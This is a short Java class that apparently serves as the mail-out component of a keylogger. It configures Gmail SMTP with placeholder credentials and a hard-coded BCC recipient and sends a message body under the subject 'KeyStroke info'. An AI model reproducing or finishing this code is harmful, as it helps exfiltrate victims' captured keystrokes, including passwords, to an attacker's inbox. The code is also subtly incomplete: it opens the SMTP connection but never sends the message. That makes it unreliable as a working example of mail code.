package handlers;

import java.util.Properties;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;

public final class Sender {

	private Sender() {
	}
	
	private static final String SENDERS_GMAIL = "email@gmail.com";
	private static final String SENDERS_PASSWORD = "password";
	
	private static final String RECIEVERS_EMAIL = "email@gmail.com";

	private static Properties mailServerProperties;
	private static Session mailSession;
	private static MimeMessage mailMessage;
	
	public static void sendMail(String body) throws Throwable {
		mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.port", "587");
		mailServerProperties.put("mail.smtp.auth", true);
		mailServerProperties.put("mail.smtp.starttls.enable", true);
		
		mailSession = Session.getDefaultInstance(mailServerProperties);
		mailMessage = new MimeMessage(mailSession);
		mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(RECIEVERS_EMAIL));
		mailMessage.setSubject("KeyStroke info");
		mailMessage.setContent(body, "text/html");
		
		Transport transport = mailSession.getTransport("smtp");
		transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
	}
	
}
